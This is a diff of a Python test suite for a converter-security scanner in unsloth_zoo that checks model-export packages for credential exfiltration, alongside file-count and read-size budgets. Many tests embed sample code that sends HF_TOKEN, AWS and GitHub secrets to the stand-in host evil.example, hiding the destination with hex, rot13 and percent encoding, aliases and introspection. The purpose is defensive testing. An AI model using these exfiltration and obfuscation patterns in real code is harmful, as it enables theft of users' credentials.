     llama_cpp = _load("llama_cpp_stuck_cache_probe", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
@@ -2799,8 +2419,7 @@ def test_a_cache_that_cannot_be_removed_is_reported(tmp_path, monkeypatch):
 
 
 def test_a_sourceless_cache_is_reported_rather_than_deleted(tmp_path, monkeypatch):
-    """Nothing can rebuild this one, so removing it would break a package that
-    genuinely ships it. Reporting keeps the scan honest without breaking export."""
+    """A sourceless cache cannot be rebuilt, so it is reported rather than deleted, which would break a package that genuinely ships it."""
     llama_cpp = _load("llama_cpp_sourceless_keep_probe", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
@@ -2817,14 +2436,7 @@ def test_a_sourceless_cache_is_reported_rather_than_deleted(tmp_path, monkeypatc
 def test_ordinary_bytecode_caches_do_not_push_a_package_over_the_cap(
     tmp_path, monkeypatch, caplog
 ):
-    """Collecting .pyc for the opaque-module check made them count as modules.
-
-    An ordinary export leaves one cache per module behind, so a package of 40
-    modules with 25 caches read as 65 files and crossed the 64 cap: a false
-    security warning in advisory mode, and under strict mode a refusal of every
-    export after the first. This module's whole contract is that a false positive
-    which refuses an export is worse than the warning is a win.
-    """
+    """Cached .pyc files must not count toward the file cap, or ordinary per-module caches push a normal package over it and refuse exports in strict mode."""
     llama_cpp = _load("llama_cpp_cache_count_probe", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
@@ -2859,13 +2471,7 @@ def test_a_pyc_beside_its_own_source_is_not_a_module_of_its_own(tmp_path):
 
 
 def test_one_wide_directory_cannot_outrun_the_entry_budget(tmp_path, monkeypatch):
-    """os.walk hands back a whole directory's names at once.
-
-    So a single directory holding a great many entries was listed in full, and
-    copied, before either budget was consulted: the advertised bounds bounded
-    nothing for the shape that matters most. Streaming the directory is what
-    makes the budget a budget.
-    """
+    """Stream each directory rather than take os.walk's full name list, which was listed and copied before either budget was checked."""
     llama_cpp = _load("llama_cpp_wide_dir_probe", "unsloth_zoo/llama_cpp.py")
 
     conversion = tmp_path / "llama.cpp" / "conversion"
@@ -2903,8 +2509,7 @@ def test_one_wide_directory_cannot_outrun_the_entry_budget(tmp_path, monkeypatch
     names, complete = walk.names, walk.complete
 
     assert complete is False
-    # The bound is on entries TOUCHED, which is the claim the budget makes. One
-    # past the limit, because seeing that many is how the limit is known crossed.
+    # The bound counts entries touched, the claim the budget makes; the one entry past the limit exists only to show the limit was crossed.
     assert len(seen) <= llama_cpp.MAX_CONVERSION_PACKAGE_ENTRIES + 1, (
         f"touched {len(seen)} of {entries} entries in one directory"
     )
@@ -2915,11 +2520,7 @@ def test_one_wide_directory_cannot_outrun_the_entry_budget(tmp_path, monkeypatch
 def test_a_package_at_exactly_the_entry_limit_is_not_called_oversized(
     tmp_path, monkeypatch, caplog, over
 ):
-    """Stopping AT the limit reported a package of exactly that many entries as
-    holding more than it does, and strict mode then refused a package that was
-    fully within its budget. The file cap already asks for one extra for this
-    reason; the entry budget has to as well.
-    """
+    """The entry budget must probe one past its limit, as the file cap does, so a package of exactly the limit is not reported oversized."""
     llama_cpp = _load(f"llama_cpp_entry_edge_probe_{over}", "unsloth_zoo/llama_cpp.py")
 
     root = tmp_path / "llama.cpp"
@@ -2944,12 +2545,8 @@ def test_a_package_at_exactly_the_entry_limit_is_not_called_oversized(
 
 
 def test_no_single_module_is_read_whole(tmp_path, monkeypatch, caplog):
-    """The cache key and the scan both read each module with a bare .read().
-
-    One very large or sparse module in an unverified package therefore allocated
-    the whole file before any size finding could be produced. Both reads are
-    bounded now, and the oversized module is reported rather than swallowed.
-    """
+    """Both the cache key and the scan read modules with bounded reads, since one unbounded .read() allocates a huge
+    module whole before any size finding; an oversized module must be reported, not swallowed."""
     llama_cpp = _load("llama_cpp_big_module_probe", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
@@ -2989,8 +2586,7 @@ def test_no_single_module_is_read_whole(tmp_path, monkeypatch, caplog):
 
 
 def test_the_cache_key_still_moves_when_an_oversized_module_changes(tmp_path):
-    """Hashing only a prefix must not make a big module's edits invisible, so the
-    size travels beside the digest."""
+    """Hashing only a prefix must not make a big module's edits invisible, so oversized modules are keyed by a prefix digest plus their size."""
     llama_cpp = _load("llama_cpp_big_key_probe", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
@@ -3029,16 +2625,7 @@ def test_a_package_within_the_cap_says_nothing_about_size(tmp_path, monkeypatch,
 
 
 def test_a_prebuilt_marker_does_not_buy_the_exemption(tmp_path, monkeypatch):
-    """UNSLOTH_PREBUILT_INFO.json reads like proof of verification and is not.
-
-    _stage_prebuilt_install checks a sha256 for the BINARY asset, and only when
-    the release published one. The converter itself arrives separately through
-    _hydrate_converter_sources, which downloads a source tarball with no digest
-    at all, and the marker is written after that. So a replaced source tarball
-    wore a "verified" marker, took the strict-mode exemption and skipped the
-    conversion/ scan with it. The converter from a prebuilt bundle is a download
-    like any other and is scanned like one.
-    """
+    """UNSLOTH_PREBUILT_INFO.json is no proof of verification: it reflects only an optional binary sha256 check, so the converter tarball must still be scanned."""
     llama_cpp = _load("llama_cpp_marker_probe", "unsloth_zoo/llama_cpp.py")
 
     bundle = tmp_path / "prebuilt"
@@ -3054,9 +2641,7 @@ def test_a_prebuilt_marker_does_not_buy_the_exemption(tmp_path, monkeypatch):
 
 
 def test_a_pin_written_with_a_tilde_is_still_a_pin(tmp_path, monkeypatch):
-    """_resolve_local_convert_script accepts the pin after expanduser, so this
-    check has to expand it too, or a deliberately pinned converter with a finding
-    is refused under strict mode as though it had been downloaded."""
+    """The pin check must expanduser() the path as _resolve_local_convert_script does, or a tilde-pinned converter with a finding is refused under strict mode."""
     llama_cpp = _load("llama_cpp_tilde_probe", "unsloth_zoo/llama_cpp.py")
 
     home = tmp_path / "home"
@@ -3074,10 +2659,7 @@ def test_a_pin_written_with_a_tilde_is_still_a_pin(tmp_path, monkeypatch):
 
 
 def test_a_converter_that_only_talks_to_the_model_hub_is_not_a_finding():
-    """Upstream's own gguf-py/gguf/utility.py reads HF_TOKEN and sends it to
-    huggingface.co as an Authorization header, which is what downloading a
-    gated model looks like.
-    """
+    """A converter that only sends HF_TOKEN to huggingface.co as an Authorization header, as upstream's gguf-py/gguf/utility.py does, is not a finding."""
     scan_converter_source = _load(
         "converter_scan_hub_probe", "unsloth_zoo/converter_scan.py",
     ).scan_converter_source
@@ -3106,8 +2688,7 @@ def test_a_converter_that_only_talks_to_the_model_hub_is_not_a_finding():
         for f in scan_converter_source(with_exfil)
     ), [f.check for f in scan_converter_source(with_exfil)]
 
-    # Naming no host at all is not a pass either: suppression needs a hub host
-    # to have been named, so a destination this cannot see keeps the finding.
+    # Naming no host at all is not a pass either: suppression needs a hub host to have been named, so an unseen destination keeps the finding.
     no_host = (
         'import os\n'
         'import requests\n'
@@ -3127,12 +2708,7 @@ def test_a_converter_that_only_talks_to_the_model_hub_is_not_a_finding():
 
 
 def test_a_host_based_network_api_refuses_the_hub_allowance():
-    """The allowance reads URLs, and two of the sinks the network rule recognises
-    do not take one. socket.create_connection(("evil.example", 443)) and
-    http.client.HTTPSConnection("evil.example") name their destination as a bare
-    host, so a file could carry a hub URL, open one of those beside it, and the
-    allowance would call that talking only to the hub.
-    """
+    """Host-based clients such as socket.create_connection and HTTPSConnection name a bare host, not a URL, so the hub allowance must refuse them."""
     scan_converter_source = _load(
         "converter_scan_host_api_probe", "unsloth_zoo/converter_scan.py",
     ).scan_converter_source
@@ -3148,8 +2724,7 @@ def test_a_host_based_network_api_refuses_the_hub_allowance():
         'import os\nimport socket\n' + hub
         + 's = socket.socket()\ns.connect(("evil.example", 443))\n'
         + 's.send(os.environ["HF_TOKEN"].encode())\n',
-        # http.server names no destination at all: it serves the token to
-        # whoever connects.
+        # http.server names no destination at all: it serves the token to whoever connects.
         'import os\nimport requests\n' + hub
         + 'url = bytes.fromhex("68747470733a2f2f6576696c2e6578616d706c65").decode()\n'
         + 'requests.get(url + os.environ["HF_TOKEN"])\n',
@@ -3162,13 +2737,11 @@ def test_a_host_based_network_api_refuses_the_hub_allowance():
         'import os\nimport requests\nimport codecs\n' + hub
         + 'requests.get(codecs.decode("uggcf://rivy.rknzcyr/p", "rot13")'
         + ' + os.environ["HF_TOKEN"])\n',
-        # Percent decoding builds one too, and the literal that spells it
-        # carries no scheme for the walk to find.
+        # Percent decoding builds a URL too, and the literal that spells it carries no scheme for the walk to find.
         'import os\nimport requests\nfrom urllib.parse import unquote\n' + hub
         + 'url = unquote("https%3A%2F%2Fevil.example%2Fcollect")\n'
         + 'requests.get(url, headers = {"a": os.environ["HF_TOKEN"]})\n',
-        # An aliased import leaves it only s.create_connection, which it does
-        # not recognise either.
+        # An aliased import leaves only s.create_connection, which the scanner does not recognise either.
         'import os\nimport requests\nimport socket as s\n' + hub
         + 'requests.get(HUB)\n'
         + 'c = s.create_connection(("evil.example", 443))\n'
@@ -3188,8 +2761,7 @@ def test_a_host_based_network_api_refuses_the_hub_allowance():
             for f in scan_converter_source(body)
         ), body
 
-    # urlparse is not in that list and must not be: upstream's utility.py parses
-    # URLs with it, and parsing one is not building one.
+    # urlparse must not be in that list: upstream's utility.py parses URLs with it, and parsing one is not building one.
     assert scan_converter_source(
         'import os\nimport requests\nfrom urllib.parse import urlparse\n' + hub
         + 'assert urlparse(HUB).scheme == "https"\n'
@@ -3202,9 +2774,7 @@ def test_a_host_based_network_api_refuses_the_hub_allowance():
         + 'requests.get(HUB, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
     ) == []
 
-    # Decoding what came BACK is upstream's own shape and must not be refused:
-    # gguf-py/gguf/utility.py reads metadata_bytes.decode("utf-8") off the
-    # download.
+    # Decoding what came back is upstream's own shape and must not be refused: gguf-py/gguf/utility.py calls metadata_bytes.decode("utf-8") on the download.
     assert scan_converter_source(
         'import os\nimport requests\n' + hub
         + 'r = requests.get(HUB, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
@@ -3213,10 +2783,7 @@ def test_a_host_based_network_api_refuses_the_hub_allowance():
 
 
 def test_the_hub_allowance_covers_a_token_authenticated_read_and_nothing_more():
-    """The hub is writable and multi-tenant, so "the destination is the hub" is
-    not on its own a reason to say nothing: a token with write scope can create
-    a public repository there and make it a channel anyone can read back.
-    """
+    """Hub destination alone is not safe: the hub is writable and multi-tenant, so the allowance covers only a token-authenticated read, not writes."""
     scan_converter_source = _load(
         "converter_scan_shape_probe", "unsloth_zoo/converter_scan.py",
     ).scan_converter_source
@@ -3231,11 +2798,7 @@ def test_the_hub_allowance_covers_a_token_authenticated_read_and_nothing_more():
     # Sending to the hub is not downloading from it.
     assert _findings('requests.post(HUB, data = os.environ["AWS_SECRET_ACCESS_KEY"])\n')
     assert _findings('requests.post(HUB, data = os.environ["HF_TOKEN"])\n')
-    # A secret that is not the hub's own token has no business going there, and
-    # that is every name, not the ones that look secret: filtering on keywords
-    # let GITHUB_PAT through, because "PAT" is not one of them, so a file
-    # reading HF_TOKEN and GITHUB_PAT and sending the second to the hub
-    # produced no finding at all.
+    # Any secret other than the hub's own token must not reach the hub, whatever its name: keyword filtering missed GITHUB_PAT, so no finding.
     assert _findings(
         'requests.get(HUB, headers = {"a": os.environ["AWS_SECRET_ACCESS_KEY"]})\n'
     )
@@ -3272,10 +2835,7 @@ def test_the_hub_allowance_covers_a_token_authenticated_read_and_nothing_more():
         '    params = os.environ.copy(),\n'
         ')\n'
     )
-    # httpx is a sink the network rule recognises, so its writes count too, and
-    # so do writes through a session or client object under ANY name: matching
-    # receivers spelled "session" or "client" missed s = requests.Session();
-    # s.post(...), which is the writable-hub channel this is here to refuse.
+    # httpx counts as a sink, and writes through a session or client under ANY name count too: name matching missed s.post on requests.Session().
     for extra in (
         'import os\nimport httpx\n' + hub
         + 'httpx.post(HUB, data = os.environ["HF_TOKEN"])\n',
@@ -3286,9 +2846,7 @@ def test_the_hub_allowance_covers_a_token_authenticated_read_and_nothing_more():
     ):
         assert [f.check for f in scan_converter_source(extra)], extra
 
-    # A read whose variable is chosen at runtime cannot be attributed to the
-    # hub's token, and an unattributable harvest used to pass by leaving the
-    # collected set empty.
+    # A runtime-chosen variable read cannot be attributed to the hub's token, so it is refused rather than leaving the collected set empty.
     assert _findings(
         'SECRET = "AWS_SECRET_ACCESS_KEY"\n'
         'requests.get(HUB, headers = {"a": os.environ[SECRET]})\n'
@@ -3297,31 +2855,24 @@ def test_the_hub_allowance_covers_a_token_authenticated_read_and_nothing_more():
         'SECRET = "AWS_SECRET_ACCESS_KEY"\n'
         'requests.get(HUB, headers = {"a": os.environ.get(SECRET)})\n'
     )
-    # A dynamic read BESIDE a legitimate hub token: the collected names are
-    # then exactly the hub's own, so only the dynamic check refuses this.
+    # A dynamic read beside a legitimate hub token: the collected names are exactly the hub's own, so only the dynamic-read check refuses it.
     assert _findings(
         'requests.get(HUB, headers = {\n'
         '    "Authorization": os.environ["HF_TOKEN"],\n'
         '    "x": os.environ[OTHER],\n'
         '})\n'
     )
-    # And a harvest with no secret-looking name among the literals: the rule
-    # fired on the word in the comment, nothing here can say what was actually
-    # read, and an empty set is not something this can attribute to the hub.
+    # A harvest with no secret-looking name is still refused: nothing can say what was read, and an empty set cannot be attributed to the hub.
     assert _findings(
         'home = os.environ["HOME"]  # not a TOKEN\n'
         'requests.get(HUB, headers = {"a": home})\n'
     )
-    # session.request("POST", ...) is a write the named methods do not cover,
-    # and only .get() accounts for an os.environ: marking every method as
-    # accounted let .values() collect the lot and .pop() take a named one.
+    # session.request("POST", ...) is a write the named methods miss; only .get() may read os.environ, since .values() and .pop() reach any name.
     assert _findings(
         's = requests.Session()\n'
         's.request("POST", HUB, data = os.environ["HF_TOKEN"])\n'
     )
-    # A prepared request carries its method in an argument rather than in the
-    # name of the call, so Session.send() is a write that neither the named
-    # methods nor .request() covered.
+    # A prepared request carries its method in an argument, not the call name, so Session.send() is a write the named methods and .request() miss.
     assert _findings(
         's = requests.Session()\n'
         'r = requests.Request("POST", HUB, data = os.environ["HF_TOKEN"])\n'
@@ -3357,8 +2908,7 @@ def test_the_hub_allowance_covers_a_token_authenticated_read_and_nothing_more():
         ')\n'
     )
 
-    # And when the collected set is genuinely EMPTY: os.environ reached through
-    # a call this does not read, with the rule firing on the comment.
+    # When the collected set is genuinely empty, os.environ reached through an unread call is still a finding, not a pass.
     assert _findings(
         'os.environ.setdefault("HF_HOME", "/tmp")  # TOKEN\n'
         'requests.get(HUB)\n'
@@ -3393,8 +2943,7 @@ def test_a_write_or_an_environment_read_under_another_name_refuses_it():
     for body in (
         'import os\nimport requests\n' + hub
         + 'post = requests.post\npost(HUB, data = os.environ["HF_TOKEN"])\n',
-        # httpx takes the method as an argument here, so stream is a write the
-        # named methods do not cover, same as request and send.
+        # httpx takes the method as an argument, so stream is a write the named methods do not cover, same as request and send.
         'import os\nimport httpx\n' + hub
         + 'c = httpx.Client()\n'
         + 'c.stream("POST", HUB, content = os.environ["HF_TOKEN"])\n',
@@ -3411,8 +2960,7 @@ def test_a_write_or_an_environment_read_under_another_name_refuses_it():
         'import os\nimport requests\nfrom os import environ as e\n' + hub
         + 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"],'
         + ' "b": e["AWS_SECRET_ACCESS_KEY"]})\n',
-        # An alias keeps no reserved spelling, so the name it lands under says
-        # nothing.
+        # An alias keeps no reserved spelling, so the name it lands under says nothing about what it reads.
         'import os\nimport requests\n' + hub
         + 'read_secret = os.getenv\n'
         + 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"],'
@@ -3422,8 +2970,7 @@ def test_a_write_or_an_environment_read_under_another_name_refuses_it():
         + 'other = vars(os)["en" + "viron"]["AWS_SECRET_ACCESS_KEY"]\n'
         + 'requests.get(HUB, params = {"a": os.environ["HF_TOKEN"],'
         + ' "b": other})\n',
-        # A module dictionary leaves the name as a string and nothing else,
-        # exactly as it did for the write methods.
+        # A module dictionary leaves the name as a string and nothing else, as it did for the write methods.
         'import os\nimport requests\n' + hub
         + 'other = vars(os)["environ"]["AWS_SECRET_ACCESS_KEY"]\n'
         + 'requests.get(HUB, params = {"a": os.environ["HF_TOKEN"],'
@@ -3432,8 +2979,7 @@ def test_a_write_or_an_environment_read_under_another_name_refuses_it():
         + 'other = os.__dict__["environ"]["AWS_SECRET_ACCESS_KEY"]\n'
         + 'requests.get(HUB, params = {"a": os.environ["HF_TOKEN"],'
         + ' "b": other})\n',
-        # The module can be renamed too, and then the receiver says nothing
-        # about what the .getenv on it reads.
+        # The module can be renamed too, as in import os as o, and then the receiver says nothing about what .getenv on it reads.
         'import os\nimport os as o\nimport requests\n' + hub
         + 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"],'
         + ' "b": o.getenv("AWS_SECRET_ACCESS_KEY")})\n',
@@ -3441,8 +2987,7 @@ def test_a_write_or_an_environment_read_under_another_name_refuses_it():
         + 'requests.get(HUB)\n'
         + 'f = vars(requests)["po" + "st"]\n'
         + 'f(HUB, data = os.environ["HF_TOKEN"])\n',
-        # A module dictionary leaves the method name as a string and nothing
-        # else.
+        # A module dictionary leaves the method name as a string and nothing else.
         'import os\nimport requests\n' + hub
         + 'requests.get(HUB)\n'
         + 'f = vars(requests)["post"]\n'
@@ -3457,8 +3002,7 @@ def test_a_write_or_an_environment_read_under_another_name_refuses_it():
         + 'requests.get(HUB)\n'
         + 'f("https://huggingface.co/api/repos/create",'
         + ' data = os.environ["HF_TOKEN"])\n',
-        # And a computed name on one of these modules is a lookup this cannot
-        # read at all.
+        # A computed name on one of these modules, like getattr(os, name), is a lookup this cannot read at all.
         'import os\nimport requests\n' + hub
         + 'name = "environ"\n'
         + 'env = getattr(os, name)\n'
@@ -3470,8 +3014,7 @@ def test_a_write_or_an_environment_read_under_another_name_refuses_it():
             for f in scan_converter_source(body)
         ), body
 
-    # os.environ and os.getenv are attributes, not bare names, and upstream's
-    # own shape reads both.
+    # os.environ and os.getenv are attributes rather than bare names, and upstream's own shape reads both.
     assert scan_converter_source(
         'import os\nimport requests\n' + hub
         + 'headers = {}\n'
@@ -3499,8 +3042,7 @@ def test_a_write_or_an_environment_read_under_another_name_refuses_it():
             + ' "b": other})\n'
         )
     ]
-    # getattr with a computed name on the file's OWN objects is upstream's
-    # shape and must stay readable.
+    # getattr with a computed name on the file's own objects is upstream's shape and must stay readable.
     assert scan_converter_source(
         'import os\nimport requests\n' + hub
         + 'class Reader:\n'
@@ -3511,9 +3053,7 @@ def test_a_write_or_an_environment_read_under_another_name_refuses_it():
 
 
 def test_an_oversized_join_is_not_folded():
-    """A join multiplies, unlike + and %, whose result is bounded by the source
-    that spells it.
-    """
+    """Unlike + and %, join multiplies its input, so an oversized join must not be folded into a literal."""
     module = _load("converter_scan_join_size_probe", "unsloth_zoo/converter_scan.py")
     separator = "A" * 100_000
     elements = ",".join(['""'] * 10_000)
@@ -3548,9 +3088,7 @@ def test_an_oversized_join_is_not_folded():
     )
     assert time.perf_counter() - started < 5
 
-    # str.format has the same ceiling and needs it for a different reason: one
-    # argument referenced by thousands of {0} fields expands far past the input
-    # cap, 110 KB of source taking 14.8 seconds before this.
+    # str.format has the same ceiling for a different reason: one argument referenced by thousands of {0} fields expands past the input cap.
     started = time.perf_counter()
     module.scan_converter_source(
         preamble
@@ -3559,9 +3097,7 @@ def test_an_oversized_join_is_not_folded():
     )
     assert time.perf_counter() - started < 5
 
-    # The ceiling is on the aggregate too: one expansion is bounded, and an
-    # 8 MiB file holds thousands of them, so the literals are iterated under a
-    # shared budget rather than materialised into a list.
+    # The ceiling also applies in aggregate: an 8 MiB file holds thousands of bounded expansions, so literals are iterated under a shared budget.
     one = '"' + "A" * 3_500 + '".join([' + ",".join(['""'] * 290) + '])\n'
     started = time.perf_counter()
     assert [
@@ -3610,9 +3146,7 @@ def test_nothing_in_the_allowance_may_raise():
 
 
 def test_a_documentation_url_in_a_docstring_is_not_a_destination():
-    """Comments never reach the literal walk, since it reads the AST, so
-    upstream's `# Reference: https://github.com/...` costs nothing.
-    """
+    """Comments never reach the literal walk, which reads the AST, so a URL in an upstream Reference comment costs nothing."""
     scan_converter_source = _load(
         "converter_scan_docstring_probe", "unsloth_zoo/converter_scan.py",
     ).scan_converter_source
@@ -3644,8 +3178,7 @@ def test_a_documentation_url_in_a_docstring_is_not_a_destination():
         'requests.get(HUB, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
     ) == []
 
-    # A docstring the file can READ is a value like any other, whether it is
-    # reached as an attribute or as the bare module-level name.
+    # A docstring the file can read is a value like any other, whether reached as an attribute or as the bare module-level name.
     assert [
         f.check for f in scan_converter_source(
             'import os\n'
@@ -3676,8 +3209,7 @@ def test_a_documentation_url_in_a_docstring_is_not_a_destination():
             'requests.get(getattr(fetch, "__doc__") + os.environ["HF_TOKEN"])\n'
         )
     ]
-    # Enumerating the spellings was losing, so anything naming __doc__,
-    # vars or __dict__ at all keeps docstrings in the scan.
+    # Enumerating spellings was losing, so anything naming __doc__, vars or __dict__ at all keeps docstrings in the scan.
     for reader in (
         'vars(fetch)["__doc__"]',
         'fetch.__dict__.get("__doc__", "")',
@@ -3705,8 +3237,7 @@ def test_a_documentation_url_in_a_docstring_is_not_a_destination():
             ' + os.environ["HF_TOKEN"])\n'
         )
     ]
-    # A key this cannot read is why the readers are named at all: the
-    # constant __doc__ never appears here, only vars does.
+    # A key this cannot read is why the readers are named at all: the constant __doc__ never appears here, only vars does.
     assert [
         f.check for f in scan_converter_source(
             'import os\n'
@@ -3718,9 +3249,7 @@ def test_a_documentation_url_in_a_docstring_is_not_a_destination():
             'requests.get(vars(fetch)[key] + os.environ["HF_TOKEN"])\n'
         )
     ]
-    # inspect.getdoc and pydoc.getdoc read it with none of those names
-    # present at all, which is why the rule is introspection rather than a
-    # list of spellings of __doc__.
+    # inspect.getdoc and pydoc.getdoc read the docstring with none of those names present, so the rule is introspection, not a spelling list.
     for reader in ('inspect.getdoc(fetch)', 'pydoc.getdoc(fetch)'):
         assert [
             f.check for f in scan_converter_source(
@@ -3748,9 +3277,7 @@ def test_a_documentation_url_in_a_docstring_is_not_a_destination():
 
 
 def test_urllib_refuses_the_hub_allowance():
-    """urllib expresses a write as Request(..., data = ...), Request(..., method =
-    "POST") or urlopen(..., data = ...).
-    """
+    """urllib expresses a write as Request with data or method POST, or urlopen with data, so the hub allowance must refuse each of these forms."""
     scan_converter_source = _load(
         "converter_scan_urllib_probe", "unsloth_zoo/converter_scan.py",
     ).scan_converter_source
@@ -3771,9 +3298,7 @@ def test_urllib_refuses_the_hub_allowance():
 
 
 def test_a_builder_or_a_docstring_reader_that_arrives_by_import_refuses_it():
-    """Three spellings the readable-name checks could not see, because the only
-    place the name appears is the import line.
-    """
+    """Builders or docstring readers imported under an alias must be refused, since name checks only see the import line where the name appears."""
     scan_converter_source = _load(
         "converter_scan_import_alias_probe", "unsloth_zoo/converter_scan.py",
     ).scan_converter_source
@@ -3811,8 +3336,7 @@ def test_a_builder_or_a_docstring_reader_that_arrives_by_import_refuses_it():
             )
         ], body
 
-    # And what upstream actually does still passes: it imports none of those
-    # modules, and every "://" it writes is preceded by a readable scheme.
+    # What upstream actually does still passes: it imports none of those modules, and every "://" it writes follows a readable scheme.
     assert scan_converter_source(
         'import os\nimport requests\nfrom urllib.parse import urlparse\n'
         + hub
@@ -3841,8 +3365,7 @@ def test_a_constant_rewritten_into_a_url_refuses_it():
             )
         ], body
 
-    # Appending a path to the hub, in the shape a chain of appends really
-    # parses in:
+    # A chain of appends that adds a path to the hub is honest code and must still pass.
     assert scan_converter_source(
         'import os\nimport requests\n' + hub
         + 'name = base.strip().replace(" ", "-").replace("/", "-")\n'
@@ -3858,9 +3381,7 @@ def test_a_constant_rewritten_into_a_url_refuses_it():
 
 
 def test_percent_formatting_is_read_whichever_way_it_is_written():
-    """The operator takes a mapping as well as a tuple, and only the tuple was
-    folded.
-    """
+    """The % operator accepts a mapping as well as a tuple, and both forms of percent formatting must be read, not only the tuple form."""
     scan_converter_source = _load(
         "converter_scan_percent_probe", "unsloth_zoo/converter_scan.py",
     ).scan_converter_source
@@ -3879,17 +3400,13 @@ def test_percent_formatting_is_read_whichever_way_it_is_written():
             )
         ], body
 
-    # A mapping template that spells the hub itself is read as the hub, which
-    # is what makes folding it worth doing rather than refusing the shape: the
-    # key has to be skipped over rather than read as the conversion, or every
-    # mapping template stays a hole and an honest one is refused.
+    # A mapping template spelling the hub is read as the hub; its key must be skipped, or every such template stays a hole and is refused.
     assert scan_converter_source(
         'import os\nimport requests\n'
         + 'url = "%(s)s://%(h)s/api" % {"s": "https", "h": "huggingface.co"}\n'
         + send
     ) == []
-    # A key the mapping does not supply raises rather than folds, and erasing
-    # the template there left the destination unnamed instead of unreadable.
+    # A key the mapping does not supply raises rather than folds; erasing the template there left the destination unnamed, not unreadable.
     assert [
         f.check for f in scan_converter_source(
             'import os\nimport requests\n' + hub
@@ -3919,15 +3436,12 @@ def test_a_url_assembled_out_of_named_constants_is_read_as_the_url_it_is():
             + 'url = scheme + separator + host\n' + send
         )
     ]
-    # One constant can be assigned through another, and the substitution runs
-    # to a fixed point: scheme = "https"; alias = scheme leaves alias
-    # unreadable until scheme has been read, one pass earlier.
+    # Constants assigned through other constants are substituted to a fixed point: alias = scheme stays unreadable until scheme is read.
     for body in (
         'scheme = "https"\nalias = scheme\n'
         'url = alias + "://evil.example/c"\n' + send,
         'a = "https"\nb = a\nc = b\nurl = c + "://evil.example/c"\n' + send,
-        # A named expression binds a value like any other assignment, and
-        # dropping it left the name unreadable and the URL with it.
+        # A named expression binds a value like any assignment; dropping it left the name unreadable and the URL with it.
         'if (scheme := "https"):\n'
         '    url = scheme + "://evil.example/c"\n    ' + send,
     ):
@@ -3943,15 +3457,13 @@ def test_a_url_assembled_out_of_named_constants_is_read_as_the_url_it_is():
         + 'url = alias + "/api"\n' + send
     ) == []
 
-    # The same assembly that names the hub is the hub, so this reads a
-    # destination rather than refusing every file that builds one.
+    # An assembly that names the hub is the hub, so the destination is read rather than refusing every file that builds one.
     assert scan_converter_source(
         'import os\nimport requests\n'
         + 'scheme = "https"\nseparator = "://"\nhost = "huggingface.co"\n'
         + 'url = scheme + separator + host\n' + send
     ) == []
-    # A name bound more than once holds no one value, so it stays a hole and
-    # the destination stays unreadable.
+    # A name bound more than once holds no single value, so it stays a hole and the destination stays unreadable.
     assert [
         f.check for f in scan_converter_source(
             'import os\nimport requests\n'
@@ -3963,9 +3475,7 @@ def test_a_url_assembled_out_of_named_constants_is_read_as_the_url_it_is():
 
 
 def test_percent_formatting_is_bounded_before_it_runs():
-    """The aggregate budget is spent on what the walk reads, and the operator runs
-    before that.
-    """
+    """Percent formatting must be bounded before it runs, since the aggregate budget is spent only on what the walk reads, not on the formatted output."""
     module = _load(
         "converter_scan_percent_bound_probe", "unsloth_zoo/converter_scan.py",
     )
@@ -3977,8 +3487,7 @@ def test_percent_formatting_is_bounded_before_it_runs():
     )
     assert module.scan_converter_source(source) == []
 
-    # The tuple form has the same ceiling, and no output bound at all on it was
-    # the shape that got past the aggregate budget.
+    # The tuple form has the same ceiling; with no output bound, it was the shape that got past the aggregate budget.
     tuples = (
         'import os\nimport requests\n'
         'HUB = "https://huggingface.co"\n'
@@ -3990,11 +3499,7 @@ def test_percent_formatting_is_bounded_before_it_runs():
 
 
 def test_a_url_object_that_is_rewritten_refuses_the_hub_allowance():
-    """A carrier does not survive a call, on purpose: upstream writes
-    cls.get_list_tensors(url).items() and response = requests.get(url), and
-    tracking what came back out of those refused the very file this allowance
-    exists for.
-    """
+    """URL carriers are not tracked across calls on purpose: following requests.get(url) results would refuse the upstream file the allowance targets."""
     scan_converter_source = _load(
         "converter_scan_wrapper_probe", "unsloth_zoo/converter_scan.py",
     ).scan_converter_source
@@ -4015,9 +3520,7 @@ def test_a_url_object_that_is_rewritten_refuses_the_hub_allowance():
             f.check for f in scan_converter_source(preamble + body)
         ], body
 
-    # And the upstream shape this rule has to stay clear of: a helper is called
-    # with the URL and the result, which is tensor metadata rather than a URL,
-    # is read with an ordinary method.
+    # Upstream's shape to stay clear of: a helper called with the URL returns tensor metadata, not a URL, read with an ordinary method.
     assert scan_converter_source(
         preamble
         + 'url = f"{HUB}/api/models"\n'
@@ -4044,16 +3547,14 @@ def test_a_url_builder_under_an_alias_or_a_result_object_refuses_it():
         'u = up.urljoin(HUB, "//evil.example/c")\n' + send,
         'u = ParseResult("https", "evil.example", "/c", "", "", "").geturl()\n'
         + send,
-        # A client URL object takes its host as a field, so no argument of it
-        # is a URL at all.
+        # A client URL object takes its host as a field, so no argument of it is a URL at all.
         'import httpx\n'
         'u = httpx.URL(scheme = "https", host = "evil.example", path = "/c")\n'
         + send,
     ):
         assert [f.check for f in scan_converter_source(preamble + body)], body
 
-    # Reading a parse result is what upstream does, twice, and it is not
-    # building one.
+    # Reading a parse result, as upstream does twice, is not building one and must still pass.
     assert scan_converter_source(
         preamble + 'u = f"{HUB}/api"\nassert up.urlparse(u).netloc\n' + send
     ) == []
@@ -4071,12 +3572,9 @@ def test_inlining_a_constant_is_charged_per_use():
         'url = ' + " + ".join(["BIG"] * 100) + '\n'
         'requests.get(HUB, params = {"t": os.environ["HF_TOKEN"]})\n'
     )
-    # And running out refuses rather than analysing what it could not read:
-    # leaving the rest of the file unsubstituted is exactly the state a payload
-    # wants, a long constant ahead of the three short ones that spell a host.
+    # Running out refuses rather than analysing what it could not read, since leaving the tail unsubstituted is what a payload wants.
     assert [f.check for f in module.scan_converter_source(source)]
-    # Charged per use, so the substitution refuses this file rather than
-    # materialising five megabytes out of a 49 KB one.
+    # Charged per use, so substitution refuses the file rather than materialising megabytes from a small input.
     import ast as ast_module
     try:
